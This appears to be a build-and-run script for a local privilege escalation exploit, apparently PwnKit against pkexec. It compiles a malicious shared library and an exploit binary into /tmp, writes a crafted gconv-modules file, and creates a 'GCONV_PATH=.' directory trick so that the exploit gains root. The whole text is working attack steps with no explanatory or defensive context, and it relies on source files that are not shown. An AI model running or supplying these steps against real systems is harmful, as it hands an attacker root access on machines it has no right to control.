mkdir /tmp/pwnkit_lpe/
gcc -shared -o /tmp/pwnkit_lpe/pwnkit.so -fPIC ./library.c
gcc ./exploit.c -o /tmp/pwnkit_lpe/pwnkit
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p "GCONV_PATH=."
cp /usr/bin/true "GCONV_PATH=./pwnkit.so:."
./pwnkit
